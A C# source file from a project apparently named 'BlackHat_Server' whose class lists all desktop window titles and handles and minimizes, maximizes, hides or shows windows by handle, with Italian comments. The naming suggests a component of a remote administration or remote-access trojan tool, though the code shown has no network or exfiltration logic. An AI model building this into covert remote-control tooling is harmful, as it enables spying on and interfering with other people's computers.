using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace BlackHat_Server
{
    class WindowsManager
    {
        public delegate bool EnumDelegate(IntPtr hWnd, int lParam);
       
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);

        
        [DllImport("user32.dll", EntryPoint = "GetWindowText",
        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpWindowText, int nMaxCount);

       
        [DllImport("user32.dll", EntryPoint = "EnumDesktopWindows",
        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDelegate lpEnumCallbackFunction, IntPtr lParam);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool ShowWindow(IntPtr hWnd, WindowStyle nCmdShow);
       

        [DllImport("user32.dll", SetLastError = true)]
        static extern int CloseWindow(IntPtr hWnd);


        /// <summary>
        /// Stringa con tutte le finestre. Formato:
        /// NOMEFINESTRA|HANDLE|VISIBILE*
        /// </summary>
        /// <returns></returns>
        public string GetWindows()
        {
            try
            {
                string exitStr = "";
                EnumDelegate filter = delegate(IntPtr hWnd, int lParam)
                {
                    StringBuilder strbTitle = new StringBuilder(255);
                    int nLength = GetWindowText(hWnd, strbTitle, strbTitle.Capacity + 1);
                    string strTitle = strbTitle.ToString();

                    if (!string.IsNullOrEmpty(strTitle))
                        exitStr += string.Format("{0}|{1}|{2}*", strTitle, hWnd, IsWindowVisible(hWnd));

                    return true;
                };

                if (EnumDesktopWindows(IntPtr.Zero, filter, IntPtr.Zero))
                    exitStr = exitStr.TrimEnd('*');



                return exitStr;
            }
            catch 
            {
                return null;
            }
           

        }


        /// <summary>
        /// Minimizza La finestra specificata
        /// </summary>
        /// <param name="Handle"></param>
        /// <returns></returns>
        public int MinimizeWindow(int Handle)
        {
            try
            {
                
                IntPtr iptrHandle = (IntPtr)Handle;
                
                //int res = CloseWindow(iptrHandle); ;

                bool test = ShowWindow(iptrHandle,WindowStyle.Minimize);

                int res = 1;

                return res;
            }
            catch 
            {
                return -1;
            }
        }


        /// <summary>
        /// Massimizza La finestra specificata
        /// </summary>
        /// <param name="Handle"></param>
        /// <returns></returns>
        public int MaximizeWindow(int Handle)
        {
            try
            {

                IntPtr iptrHandle = (IntPtr)Handle;                

                bool test = ShowWindow(iptrHandle, WindowStyle.ShowMaximized);

                int res = 1;

                return res;
            }
            catch
            {
                return -1;
            }
        }

        /// <summary>
        /// Nasconde La finestra specificata
        /// </summary>
        /// <param name="Handle"></param>
        /// <returns></returns>
        public int HideWindow(int Handle)
        {
            try
            {

                IntPtr iptrHandle = (IntPtr)Handle;                

                bool test = ShowWindow(iptrHandle, WindowStyle.Hide);

                int res = 1;

                return res;
            }
            catch
            {
                return -1;
            }
        }

        /// <summary>
        /// Show La finestra specificata
        /// </summary>
        /// <param name="Handle"></param>
        /// <returns></returns>
        public int ShowWindow(int Handle)
        {
            try
            {

                IntPtr iptrHandle = (IntPtr)Handle;

                bool test = ShowWindow(iptrHandle, WindowStyle.ShowNormal);

                int res = 1;

                return res;
            }
            catch
            {
                return -1;
            }
        }


    }
}
